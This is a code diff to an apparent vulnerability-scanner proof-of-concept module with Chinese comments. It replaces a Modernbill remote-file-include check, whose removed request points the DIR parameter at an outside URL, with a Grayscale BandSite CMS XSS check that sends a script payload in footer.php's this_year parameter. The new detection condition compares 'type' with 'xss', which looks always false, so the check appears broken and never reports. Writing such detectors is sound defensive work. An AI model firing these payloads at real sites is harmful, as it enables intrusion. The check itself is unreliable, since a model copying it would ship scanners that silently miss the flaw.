@@ -6,25 +6,27 @@ import re
 
 
 class Vuln(ABVuln):
-    vuln_id = 'Modernbill_0000'  # 平台漏洞编号
-    # 漏洞名称
-    name = 'Modernbill <= 1.6 (config.php) Remote File Include Vulnerability'
+    vuln_id = 'Grayscale-BandSite-CMS_0000'  # 平台漏洞编号
+    name = 'Grayscale-BandSite-CMS 1.1 footer.php this_year Parameter XSS'  # 漏洞名称
     level = VulnLevel.MED  # 漏洞危害级别
-    type = VulnType.LFI  # 漏洞类型
-    disclosure_date = '2006-08-09'  # 漏洞公布时间
+    type = VulnType.XSS  # 漏洞类型
+    disclosure_date = '2006-9-21'  # 漏洞公布时间
     desc = '''
-        ModernGigabyte ModernBill 1.6的include/html/config.php脚本存在PHP远程文件包含漏洞，远程攻击者可借助DIR参数中的URL执行任意PHP代码。
-        Modernbill <= 1.6 (config.php)文件存在远程文件包含漏洞。
+        Grayscale BandSite CMS is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize
+        user-supplied input data.These issues may allow an attacker to access sensitive information, execute arbitrary 
+        server-side script code in the context of the affected webserver, or execute arbitrary script code in the browser of
+        an unsuspecting user in the context of the affected site. This could help the attacker steal cookie-based 
+        authentication credentials; other attacks are possible.Version 1.1.0 is vulnerable; other versions may also be affected.。
     '''  # 漏洞描述
-    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2006-6105'
-    cnvd_id = 'CNVD-2006-6105'  # cnvd漏洞编号
-    cve_id = 'CVE-2006-4034'  # cve编号
-    product = 'Modernbill'  # 漏洞组件名称
-    product_version = '<= 1.6'  # 漏洞应用版本
+    ref = 'https://www.securityfocus.com/bid/20137'
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
+    product = 'Grayscale-BandSite-CMS'  # 漏洞组件名称
+    product_version = '1.1'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = '15400ded-8b24-4dca-95ba-9f39205a2d46'  # 平台 POC 编号
+    poc_id = '6edacaef-d64b-423a-8671-964dffe39026'  # 平台 POC 编号
     author = '国光'  # POC编写者
     create_date = '2018-06-01'  # POC创建时间
 
@@ -50,9 +52,10 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            vul_url = arg + '/include/html/config.php?DIR=http://baidu.com/robots.txt?'
-            response = requests.get(vul_url).text
-            if 'Baiduspider' in response or 'Googlebot' in response:
+            vul_url = arg + \
+                '/includes/footer.php?this_year=<script>alert(/Dirorder/)</script>'
+            response = requests.get(vul_url, timeout=5).text
+            if type == 'xss' and '>alert(/Dirorder/)<' in response:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
